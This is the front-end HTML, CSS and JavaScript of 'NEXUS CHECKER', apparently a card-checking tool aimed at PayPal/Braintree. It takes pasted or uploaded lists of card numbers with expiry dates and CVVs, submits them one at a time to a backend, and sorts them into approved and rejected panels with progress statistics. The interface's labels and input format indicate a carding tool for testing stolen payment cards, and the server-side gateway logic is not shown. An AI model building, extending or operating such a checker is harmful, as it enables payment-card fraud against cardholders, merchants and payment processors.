  margin-top: 12px; width: 100%;
}
.btn-sm:hover { border-color: var(--cyan); color: var(--cyan); }

/* ============================================================
   STATUS BAR
   ============================================================ */
.status-bar {
  display: flex; align-items: center; gap: 16px;
  margin-bottom: 16px; font-family: var(--font-mono); font-size: 12px;
}
.badge {
  padding: 4px 14px; letter-spacing: 2px; text-transform: uppercase;
  font-size: 10px;
  clip-path: polygon(6px 0%, 100% 0%, calc(100% - 6px) 100%, 0% 100%);
  font-family: var(--font-hud); font-weight: 700;
}
.badge-idle       { background: var(--dim);   color: var(--muted); }
.badge-processing { background: var(--cyan);  color: var(--bg); animation: pulse-badge .8s ease-in-out infinite alternate; }
.badge-paused     { background: var(--amber); color: var(--bg); }
.badge-completed  { background: var(--green); color: var(--bg); }
@keyframes pulse-badge { from{opacity:1} to{opacity:.6} }
.status-msg { color: var(--muted); }

/* ============================================================
   PROGRESS
   ============================================================ */
.progress-wrap {
  background: rgba(0,0,0,0.5); border: 1px solid var(--dim);
  height: 6px; margin-bottom: 20px; overflow: hidden; position: relative;
}
.progress-fill {
  height: 100%;
  background: linear-gradient(90deg, var(--cyan), var(--cyan2));
  transition: width .4s ease; position: relative;
  box-shadow: 0 0 10px var(--cyan);
}
.progress-fill::after {
  content:''; position: absolute; right: 0; top: 0; bottom: 0;
  width: 20px; background: linear-gradient(90deg, transparent, white); opacity: .5;
}

/* ============================================================
   STATS
   ============================================================ */
.stats-row {
  display: grid; grid-template-columns: repeat(6, 1fr);
  gap: 10px; margin-bottom: 4px;
}
@media (max-width: 900px) { .stats-row { grid-template-columns: repeat(3, 1fr); } }
@media (max-width: 500px) { .stats-row { grid-template-columns: repeat(2, 1fr); } }

.stat {
  background: rgba(0,0,0,0.4); border: 1px solid var(--dim);
  padding: 12px; text-align: center; position: relative; overflow: hidden;
}
.stat::before {
  content: ''; position: absolute; bottom: 0; left: 0; right: 0;
  height: 1px; background: var(--cyan); opacity: .3;
}
.stat-val {
  font-family: var(--font-hud); font-size: 28px; font-weight: 900;
  color: #fff; line-height: 1; text-shadow: 0 0 10px rgba(255,255,255,0.3);
}
.stat-val.c-green { color: var(--green); text-shadow: 0 0 10px rgba(0,255,136,0.4); }
.stat-val.c-red   { color: var(--red);   text-shadow: 0 0 10px rgba(255,45,85,0.4); }
.stat-key {
  font-family: var(--font-mono); font-size: 10px; color: var(--muted);
  letter-spacing: 2px; margin-top: 5px; text-transform: uppercase;
}

/* ============================================================
   RESULTS GRID
   ============================================================ */
.results-grid {
  display: grid; grid-template-columns: 1fr 1fr 0.9fr;
  gap: 16px; margin-top: 16px;
}
@media (max-width: 1100px) { .results-grid { grid-template-columns: 1fr 1fr; } }
@media (max-width: 700px)  { .results-grid { grid-template-columns: 1fr; } }

.panel-green { border-color: rgba(0,255,136,0.2); }
.panel-green::before, .panel-green::after { border-color: var(--green); }
.panel-red   { border-color: rgba(255,45,85,0.2); }
.panel-red::before,   .panel-red::after   { border-color: var(--red); }
.panel-blue  { border-color: rgba(0,120,255,0.2); }
.panel-blue::before,  .panel-blue::after  { border-color: #0078ff; }

.panel-label.green { color: var(--green); }
.panel-label.red   { color: var(--red); }
.panel-label.blue  { color: #0078ff; }

.count-badge {
  background: rgba(0,0,0,0.5); border: 1px solid;
  font-family: var(--font-hud); font-size: 12px; font-weight: 700;
  padding: 2px 10px;
  clip-path: polygon(4px 0%, 100% 0%, calc(100% - 4px) 100%, 0% 100%);
  margin-left: 8px;
}
.count-badge.green { border-color: var(--green); color: var(--green); }
.count-badge.red   { border-color: var(--red);   color: var(--red); }

/* ============================================================
   OUTPUT BOXES
   ============================================================ */
.out-box {
  background: rgba(0,0,0,0.5); border: 1px solid var(--dim);
  padding: 14px; min-height: 280px; max-height: 480px;
  overflow-y: auto; font-family: var(--font-mono);
  font-size: 12px; line-height: 1.9; scrollbar-width: thin;
}
.out-box.green-scroll { scrollbar-color: var(--green) var(--bg2); }
.out-box.red-scroll   { scrollbar-color: var(--red)   var(--bg2); }
.out-box.blue-scroll  { scrollbar-color: #0078ff      var(--bg2); }
.out-box::-webkit-scrollbar       { width: 4px; }
.out-box::-webkit-scrollbar-track { background: var(--bg2); }
.out-box::-webkit-scrollbar-thumb { border-radius: 2px; }
.out-box.green-scroll::-webkit-scrollbar-thumb { background: var(--green); }
.out-box.red-scroll::-webkit-scrollbar-thumb   { background: var(--red); }
.out-box.blue-scroll::-webkit-scrollbar-thumb  { background: #0078ff; }

.out-empty {
  color: var(--muted); text-align: center;
  padding: 50px 0; letter-spacing: 1px; font-size: 11px;
}

.r-item {
  padding: 5px 8px; margin-bottom: 3px;
  border-left: 2px solid;
  background: rgba(255,255,255,0.02);
  word-break: break-all;
}
.r-item.ok  { border-color: var(--green); color: var(--green); }
.r-item.nok { border-color: var(--red);   color: #ff7295; }

.log-line { color: var(--muted); word-break: break-all; }
.log-line.ok  { color: rgba(0,255,136,.7); }
.log-line.nok { color: rgba(255,45,85,.7); }
.log-line.inf { color: rgba(0,212,255,.6); }

/* ============================================================
   FOOTER
   ============================================================ */
.footer {
  text-align: center; font-family: var(--font-mono);
  font-size: 11px; color: var(--muted); letter-spacing: 2px;
  padding: 30px 0 10px; border-top: 1px solid var(--border); margin-top: 24px;
}

/* ============================================================
   ANIMATIONS
   ============================================================ */
@keyframes fadeIn { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:none} }
.r-item { animation: fadeIn .25s ease forwards; }
</style>
</head>
<body>

<a href="/dashboard.php" class="back-btn"><span class="arr">←</span> DASHBOARD</a>

<div class="wrap">

  <!-- HEADER -->
  <div class="hdr">
    <div class="hdr-logo">NEXUS CHECKER</div>
    <div class="hdr-sub">PayPal · Braintree · BIN Lookup · v4.0</div>
    <div class="hdr-line"></div>
  </div>

  <!-- INPUT PANEL -->
  <div class="panel" style="margin-bottom:16px;">
    <div class="panel-label">// INPUT — Lista de Cartões</div>

    <div class="input-grid">
      <textarea id="listaInput" placeholder="Cole sua lista de cartões aqui (um por linha)&#10;Formatos aceitos:&#10;  4111111111111111|12|2025|123&#10;  4111111111111111/12/2025/123&#10;  4111111111111111 12 2025 123"></textarea>

      <div class="file-zone" id="fileZone">
        <svg width="36" height="36" fill="none" viewBox="0 0 24 24" stroke="currentColor" style="color:var(--cyan)">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 13h6m-3-3v6m5 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
        </svg>
        <div class="file-zone-label">CLIQUE OU ARRASTE<br>.TXT</div>
        <div class="file-name" id="fileName"></div>
        <input type="file" id="fileInput" accept=".txt">
      </div>
    </div>

    <!-- BUTTONS -->
    <div class="btn-row">
      <button class="btn btn-start"  id="btnStart">⚡ INICIAR</button>
      <button class="btn btn-pause"  id="btnPause"  disabled>⏸ PAUSAR</button>
      <button class="btn btn-resume" id="btnResume" disabled>▶ RETOMAR</button>
      <button class="btn btn-clear"  id="btnClear">✕ LIMPAR</button>
    </div>

    <!-- STATUS + PROGRESS -->
    <div class="status-bar">
      <span class="badge badge-idle" id="statusBadge">IDLE</span>
      <span class="status-msg" id="statusMsg">Aguardando...</span>
    </div>
    <div class="progress-wrap">
      <div class="progress-fill" id="progressFill" style="width:0%"></div>
    </div>

    <!-- STATS -->
    <div class="stats-row">
      <div class="stat"><div class="stat-val"         id="sTotal">0</div><div class="stat-key">Total</div></div>
      <div class="stat"><div class="stat-val"         id="sProcessados">0</div><div class="stat-key">Processados</div></div>
      <div class="stat"><div class="stat-val c-green" id="sAprovadas">0</div><div class="stat-key">✅ Aprovadas</div></div>
      <div class="stat"><div class="stat-val c-red"   id="sReprovadas">0</div><div class="stat-key">❌ Reprovadas</div></div>
      <div class="stat"><div class="stat-val"         id="sRestantes">0</div><div class="stat-key">Restantes</div></div>
      <div class="stat"><div class="stat-val"         id="sPct">0%</div><div class="stat-key">Concluído</div></div>
    </div>
  </div>

  <!-- RESULTS GRID -->
  <div class="results-grid">

    <!-- APROVADAS -->
    <div class="panel panel-green">
      <div class="panel-label green">
        // APROVADAS
        <span class="count-badge green" id="cntAprov">0</span>
      </div>
      <div class="out-box green-scroll" id="boxAprov">
        <div class="out-empty">— aguardando resultados —</div>
      </div>
    </div>

    <!-- REPROVADAS -->
    <div class="panel panel-red">
      <div class="panel-label red">
        // REPROVADAS
        <span class="count-badge red" id="cntReprov">0</span>
      </div>
      <div class="out-box red-scroll" id="boxReprov">
        <div class="out-empty">— aguardando resultados —</div>
      </div>
    </div>

    <!-- CONSOLE -->
    <div class="panel panel-blue">
      <div class="panel-label blue">// CONSOLE</div>
      <div class="out-box blue-scroll" id="boxLog">
        <div class="log-line">⚡ Sistema pronto para operar</div>
      </div>
      <button class="btn-sm" id="btnClearLog">✕ LIMPAR CONSOLE</button>
    </div>

  </div>

  <div class="footer">
    NEXUS CHECKER © 2026 &nbsp;|&nbsp; PAYPAL BRAINTREE &nbsp;|&nbsp; BIN LOOKUP INTEGRADO &nbsp;|&nbsp; @OtoNexusCloud
  </div>

</div><!-- /wrap -->

<script>
'use strict';

const listaInput   = document.getElementById('listaInput');
const fileInput    = document.getElementById('fileInput');
const fileZone     = document.getElementById('fileZone');
const fileName     = document.getElementById('fileName');
const btnStart     = document.getElementById('btnStart');
const btnPause     = document.getElementById('btnPause');
const btnResume    = document.getElementById('btnResume');
const btnClear     = document.getElementById('btnClear');
const btnClearLog  = document.getElementById('btnClearLog');
const statusBadge  = document.getElementById('statusBadge');
const statusMsg    = document.getElementById('statusMsg');
const progressFill = document.getElementById('progressFill');
const sTotal       = document.getElementById('sTotal');
const sProcessados = document.getElementById('sProcessados');
const sAprovadas   = document.getElementById('sAprovadas');
const sReprovadas  = document.getElementById('sReprovadas');
const sRestantes   = document.getElementById('sRestantes');
const sPct         = document.getElementById('sPct');
const cntAprov     = document.getElementById('cntAprov');
const cntReprov    = document.getElementById('cntReprov');
const boxAprov     = document.getElementById('boxAprov');
const boxReprov    = document.getElementById('boxReprov');
const boxLog       = document.getElementById('boxLog');

let pollingInterval    = null;
let processingInterval = null;
let approvedFirst      = true;
let reprovedFirst      = true;
let logFirst           = true;

/* ── File zone ── */
fileZone.addEventListener('click', () => fileInput.click());
fileZone.addEventListener('dragover', e => { e.preventDefault(); fileZone.style.borderColor = 'var(--cyan)'; });
fileZone.addEventListener('dragleave', () => { fileZone.style.borderColor = ''; });
fileZone.addEventListener('drop', e => {
  e.preventDefault(); fileZone.style.borderColor = '';
  const f = e.dataTransfer.files[0];
  if (f) handleFile(f);
});
fileInput.addEventListener('change', e => { if (e.target.files[0]) handleFile(e.target.files[0]); });

function handleFile(f) {
  const reader = new FileReader();
  reader.onload = e => { listaInput.value = e.target.result; };
  reader.readAsText(f);
  fileName.textContent = f.name;
  fileZone.classList.add('active');
}

/* ── START ── */
btnStart.addEventListener('click', () => {
  const lista = listaInput.value.trim();
  if (!lista && !fileInput.files.length) {
    flashMsg('⚠ Insira cartões ou selecione um arquivo .txt', 'var(--amber)');
    return;
  }
  const fd = new FormData();
  fd.append('action', 'iniciar_processamento');
  fd.append('lista', lista);
  if (fileInput.files[0]) fd.append('arquivo', fileInput.files[0]);

  btnStart.disabled = true;
  btnStart.textContent = '⏳ INICIANDO...';

  fetch('?action=iniciar_processamento', { method:'POST', body: fd })
    .then(r => r.json())
    .then(d => {
      if (d.success) {
        updateUI('processing', 0, 0, 0, d.total);
        statusMsg.textContent = `Processando ${d.total} cartões...`;
        startPolling();
        startProcessingLoop();
      } else {
        flashMsg('ERRO: ' + d.error, 'var(--red)');
        btnStart.disabled = false;
        btnStart.textContent = '⚡ INICIAR';
      }
    })
    .catch(() => {
      flashMsg('Falha na requisição', 'var(--red)');
      btnStart.disabled = false;
      btnStart.textContent = '⚡ INICIAR';
    });
});

/* ── PROCESSING LOOP ── */
function startProcessingLoop() {
  if (processingInterval) clearInterval(processingInterval);
  processingInterval = setInterval(() => {
    fetch('?action=get_status')
      .then(r => r.json())
      .then(d => {
        if (d.status === 'processing' && d.processados < d.total) {
          processNext();
        } else if (d.status === 'completed' || d.status === 'idle') {
          clearInterval(processingInterval);
          processingInterval = null;
        }
      });
  }, 1800);
}

function processNext() {
  fetch('?action=processar_proximo', { method:'POST' })
    .then(r => r.json())
    .then(d => {
      if (!d.success) return;
      updateUI(d.status || 'processing', d.processados, d.aprovadas, d.reprovadas, d.total);
      addResult(d.resultado);
      if (d.completed) {
        clearInterval(processingInterval);
        processingInterval = null;
        statusMsg.textContent = '⚡ Processamento concluído!';
      }
    });
}

/* ── PAUSE ── */
btnPause.addEventListener('click', () => {
  fetch('?action=pausar')
    .then(r => r.json())
    .then(d => {
      if (d.success) {
        updateUI('paused');
        statusMsg.textContent = '⏸ Pausado';
        if (processingInterval) { clearInterval(processingInterval); processingInterval = null; }
      }
    });
});

/* ── RESUME ── */
btnResume.addEventListener('click', () => {
  fetch('?action=retomar')
    .then(r => r.json())
    .then(d => {
      if (d.success) {
        updateUI('processing');
        statusMsg.textContent = '▶ Retomado';
        startProcessingLoop();
      }
    });
});

/* ── CLEAR ── */
btnClear.addEventListener('click', () => {
  fetch('?action=limpar')
    .then(r => r.json())
    .then(d => {
      if (!d.success) return;
      if (pollingInterval)    { clearInterval(pollingInterval);    pollingInterval    = null; }
      if (processingInterval) { clearInterval(processingInterval); processingInterval = null; }
      listaInput.value = '';
      fileInput.value  = '';
      fileName.textContent = '';
      fileZone.classList.remove('active');
      approvedFirst = reprovedFirst = logFirst = true;
      boxAprov.innerHTML  = '<div class="out-empty">— aguardando resultados —</div>';
      boxReprov.innerHTML = '<div class="out-empty">— aguardando resultados —</div>';
      boxLog.innerHTML    = '<div class="log-line">⚡ Sessão reiniciada</div>';
      updateUI('idle', 0, 0, 0, 0);
      statusMsg.textContent = 'Aguardando...';
      btnStart.disabled = false;
      btnStart.textContent = '⚡ INICIAR';
    });
});

/* ── CLEAR LOG ── */
btnClearLog.addEventListener('click', () => {
  boxLog.innerHTML = '<div class="log-line">— console limpo —</div>';
});

/* ── POLLING ── */
function startPolling() {
  if (pollingInterval) clearInterval(pollingInterval);
  pollingInterval = setInterval(() => {
    fetch('?action=get_status')
      .then(r => r.json())
      .then(d => {
        updateUI(d.status, d.processados, d.aprovadas, d.reprovadas, d.total);

        if (d.logs && d.logs.length) {
          boxLog.innerHTML = '';
          d.logs.slice(-80).forEach(l => appendLog(l));
        }

        if (d.aprovadas_list && d.aprovadas_list.length) {
          boxAprov.innerHTML = '';
          approvedFirst = true;
          d.aprovadas_list.slice(-100).forEach(item => addToBox(boxAprov, item, 'ok'));
          approvedFirst = false;
        }
        if (d.reprovadas_list && d.reprovadas_list.length) {
          boxReprov.innerHTML = '';
          reprovedFirst = true;
          d.reprovadas_list.slice(-100).forEach(item => addToBox(boxReprov, item, 'nok'));
          reprovedFirst = false;
        }

        if (d.status === 'completed') {
          clearInterval(pollingInterval);
          pollingInterval = null;
        }
      });
  }, 1500);
}

/* ── UI HELPERS ── */
function updateUI(status, proc, aprov, reprov, total) {
  const map = {
    idle:       { cls: 'badge-idle',       lbl: 'IDLE'   },
    processing: { cls: 'badge-processing', lbl: 'ONLINE' },
    paused:     { cls: 'badge-paused',     lbl: 'PAUSED' },
    completed:  { cls: 'badge-completed',  lbl: 'DONE'   },
  };
  const s = map[status] || map.idle;
  statusBadge.className   = 'badge ' + s.cls;
  statusBadge.textContent = s.lbl;

  if (proc   !== undefined) { sProcessados.textContent = proc; }
  if (aprov  !== undefined) { sAprovadas.textContent   = aprov;  cntAprov.textContent  = aprov; }
  if (reprov !== undefined) { sReprovadas.textContent  = reprov; cntReprov.textContent = reprov; }
  if (total  !== undefined) {
    sTotal.textContent     = total;
    const rem = Math.max(0, total - (proc || 0));
    sRestantes.textContent = rem;
    const pct = total > 0 ? Math.round(((proc||0)/total)*100) : 0;
    sPct.textContent       = pct + '%';
    progressFill.style.width = pct + '%';
  }

  btnStart.disabled  = (status === 'processing' || status === 'paused');
  btnPause.disabled  = (status !== 'processing');
  btnResume.disabled = (status !== 'paused');
}

function addResult(result) {
  if (!result) return;
  const isOk = result.includes('✅');
  if (isOk) {
    if (approvedFirst) { boxAprov.innerHTML = ''; approvedFirst = false; }
    addToBox(boxAprov, result, 'ok');
  } else {
    if (reprovedFirst) { boxReprov.innerHTML = ''; reprovedFirst = false; }
    addToBox(boxReprov, result, 'nok');
  }
}

function addToBox(box, text, cls) {
  const div = document.createElement('div');
  div.className = 'r-item ' + cls;
  div.textContent = text;
  box.appendChild(div);
  box.scrollTop = box.scrollHeight;
}

function appendLog(text) {
  if (logFirst) { boxLog.innerHTML = ''; logFirst = false; }
  const lines = text.split('\n').filter(l => l.trim());
  lines.forEach(l => {
    const div = document.createElement('div');
    div.className = 'log-line' +
      (l.includes('✓') || l.includes('APROVAD') ? ' ok'  : '') +
      (l.includes('✗') || l.includes('REPROVAD') ? ' nok' : '') +
      (l.includes('BIN') || l.includes('Token') || l.includes('Order') ? ' inf' : '');
    div.textContent = l;
    boxLog.appendChild(div);
  });
  boxLog.scrollTop = boxLog.scrollHeight;
}

function flashMsg(msg, color) {
  statusMsg.style.color   = color;
  statusMsg.textContent   = msg;
  setTimeout(() => { statusMsg.style.color = ''; statusMsg.textContent = 'Aguardando...'; }, 3000);
}
</script>
</body>
</html>